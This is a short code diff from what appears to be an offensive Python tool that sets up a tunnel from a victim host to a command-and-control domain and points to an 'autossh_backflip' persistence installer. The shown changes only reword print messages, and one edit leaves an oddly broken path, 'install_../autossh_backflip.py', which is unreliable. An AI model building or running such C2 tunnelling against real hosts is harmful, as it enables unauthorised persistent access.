@@ -12,7 +12,7 @@ import tempfile
 logging = True
 
 def usage():
-    print "usage: %s <username> <victim_host> <c2_fqdn> <port>" % sys.argv[0]
+    print "usage: %s <username> <victim_hostname> <c2_fqdn> <port>" % sys.argv[0]
     sys.exit(1)
 
 def templify(template, replacements):
@@ -56,7 +56,7 @@ def main():
     port = sys.argv[4]
 
     print "[*] username: %s" % username
-    print "[*] victim host: %s" % victim_hostname
+    print "[*] victim hostname: %s" % victim_hostname
     print "[*] fqdn: %s" % fqdn
     print "[*] port: %s" % port
 
@@ -93,7 +93,7 @@ def main():
     f = tempfile.NamedTemporaryFile(delete=False)
     f.write(cmd)
     print "[+] This is also available to you in the file %s" % f.name
-    print "[*] Once this tunnel is up run: install_autossh_backflip.py %s PROXYPORT %s" % (port, KEYPATH)
+    print "[*] Once this tunnel is up run: install_../autossh_backflip.py %s PROXYPORT %s" % (port, KEYPATH)
 
 
 if __name__ == "__main__":
